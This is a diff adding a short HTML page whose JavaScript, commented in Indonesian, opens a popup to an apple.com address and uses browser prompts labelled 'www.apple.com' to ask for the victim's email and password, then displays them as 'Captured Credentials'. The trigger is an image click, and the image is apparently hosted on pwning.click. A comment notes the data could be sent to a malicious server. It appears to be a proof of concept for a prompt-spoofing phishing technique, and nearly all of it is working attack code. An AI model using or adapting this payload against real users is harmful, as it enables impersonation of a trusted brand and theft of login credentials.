@@ -1,0 +1,24 @@
+<script>
+function a() {
+    // Buka popup ke domain lain (misalnya untuk mengelabui korban)
+    var x = window.open('//apple.com:88');
+
+    // Prompt pertama: Email
+    var email = x.prompt("www.apple.com\n\nEmail:");
+
+    // Prompt kedua: Password
+    var password = x.prompt("www.apple.com\n\nPassword:");;
+   
+
+    // Tampilkan data di halaman utama (bisa juga dikirim ke server jahat)
+    if (email !== null && password !== null) {
+        document.write("<h2>Captured Credentials</h2>");
+        document.write("<p>Email: " + email + "</p>");
+        document.write("<p>Password: " + password + "</p>");
+    }
+}
+</script>
+
+<center>
+  <img src="https://pwning.click/Genius_Cat.jpg" onclick="a()">
+</center>
